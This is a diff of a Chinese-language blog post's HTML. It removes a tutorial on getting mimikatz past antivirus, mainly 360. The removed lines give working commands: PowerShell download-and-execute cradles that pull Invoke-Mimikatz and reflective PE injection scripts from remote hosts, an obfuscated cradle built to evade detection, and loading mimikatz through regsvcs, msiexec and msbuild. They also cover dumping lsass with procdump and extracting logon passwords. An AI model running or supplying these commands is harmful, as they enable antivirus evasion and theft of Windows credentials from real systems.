@@ -398,43 +398,6 @@ height:50vh;
         <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00. 简介"></a>0x00. 简介</h3><p>用户绕过杀软执行mimikatz，这里主要是绕过360，未处理的mimikatz会被直接查杀</p>
 <p><img src="https://i.loli.net/2019/11/01/LnlSQOEf2BCpTvD.png" alt="1.png"></p>
 <h3 id="0x01-powershell"><a href="#0x01-powershell" class="headerlink" title="0x01. powershell"></a>0x01. <strong>powershell</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1</span><br></pre></td></tr></table></figure>
-<p>cmd下执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\test\Desktop&gt;powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/11/01/5LMTGkJNtRn9YBP.png" alt="2.png"></p>
-<p>也可以远程加载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.2.118/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/11/01/VRk9wTaS6bLjEHp.png" alt="3.png"></p>
-<p>被拦截掉了，旧版本可通过混淆绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot; (&apos;IEX &apos;+&apos;(Ne&apos;+&apos;w-O&apos;+&apos;bject Ne&apos;+&apos;t.W&apos;+&apos;ebClien&apos;+&apos;t).Do&apos;+&apos;wnloadS&apos;+&apos;trin&apos;+&apos;g&apos;+&apos;(&apos;+&apos;1vchttp://&apos;+&apos;192.168.0&apos;+&apos;.101/&apos;+&apos;Inv&apos;+&apos;oke-Mimik&apos;+&apos;a&apos;+&apos;tz.&apos;+&apos;ps11v&apos;+&apos;c)&apos;+&apos;;&apos;+&apos;I&apos;+&apos;nvoke-Mimika&apos;+&apos;tz&apos;).REplaCE(&apos;1vc&apos;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-用-net2-0加载mimikatz"><a href="#0x02-用-net2-0加载mimikatz" class="headerlink" title="0x02. 用.net2.0加载mimikatz"></a>0x02. <strong>用.net2.0加载mimikatz</strong></h3><p>下载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.githubusercontent.com/nicholasmckinney/896b508b6cf1e8c3e567ccab29c8d3ec/raw/afa7219adbfcdfc160c163273ef8ec61ff0658b4/katz.cs</span><br></pre></td></tr></table></figure>
-<p>将katz.cs放置C:\Windows\Microsoft.NET\Framework\v2.0.50727</p>
-<p>先powoershell执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = &apos;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&apos;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
-<p>再cmd执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-msiexec加载mimikatz"><a href="#0x03-msiexec加载mimikatz" class="headerlink" title="0x03. msiexec加载mimikatz"></a>0x03. <strong>msiexec加载mimikatz</strong></h3><p>下载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi</span><br></pre></td></tr></table></figure>
-<p>远程执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestartcmd:&gt; msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestart</span><br></pre></td></tr></table></figure>
-<p>本地执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /passive /i C:\Users\Administrator\Desktop\Mimikatz.msi</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-net4-0加载mimikatz"><a href="#0x04-net4-0加载mimikatz" class="headerlink" title="0x04. net4.0加载mimikatz"></a>0x04. <strong>net4.0加载mimikatz</strong></h3><p>下载mimikatz.xml</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</span><br></pre></td></tr></table></figure>
-<p>执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild&lt;.exemimikatz.xml</span><br></pre></td></tr></table></figure>
-<h3 id="0x05-内存中加载mimikatz"><a href="#0x05-内存中加载mimikatz" class="headerlink" title="0x05. 内存中加载mimikatz"></a>0x05. <strong>内存中加载mimikatz</strong></h3><p>下载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</span><br></pre></td></tr></table></figure>
-<p>执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.2.111/Invoke-ReflectivePEInjection.ps1&apos;);Invoke-ReflectivePEInjection -PEUrl http://192.168.2.111/mimikatz.exe -ExeArgs &quot;sekurlsa::logonpasswords&quot; -ForceASLR</span><br></pre></td></tr></table></figure>
-<h3 id="0x06-导出lsass进程离线读密码"><a href="#0x06-导出lsass进程离线读密码" class="headerlink" title="0x06. 导出lsass进程离线读密码"></a>0x06. <strong>导出lsass进程离线读密码</strong></h3><p>下载procdump64.exe</p>
-<p>执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>
-<p>也可以在任务管理器中操作</p>
-<p><img src="https://i.loli.net/2019/11/02/8mItHVeZQOf4KFW.png" alt="4.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/11/02/HlKdVNufzr6o42M.png" alt="5.png"></p>
-
     </article>
     <!-- license  -->
     
